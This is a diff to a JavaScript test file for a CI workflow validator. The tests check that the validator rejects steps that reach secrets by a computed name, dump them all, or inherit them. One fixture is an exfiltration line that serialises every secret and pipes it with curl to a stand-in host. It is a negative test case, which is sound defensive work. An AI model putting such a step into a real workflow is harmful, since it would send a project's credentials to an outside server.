@@ -245,7 +245,7 @@ describe('one job publishes the extension, behind an approval', () => {
 
   it('refuses a secret reached by a computed name or all at once, even in the one job', () => {
     const computed = `      - run: echo "\${{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
-    const dumped = "      - run: echo '${{ toJSON(secrets) }}' | curl -d @- https://example.test\n";
+    const dumped = `      - run: echo '\${{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
     const inherited = '    secrets: inherit\n';
     for (const [step, job] of [
       [computed, 'vsix'],
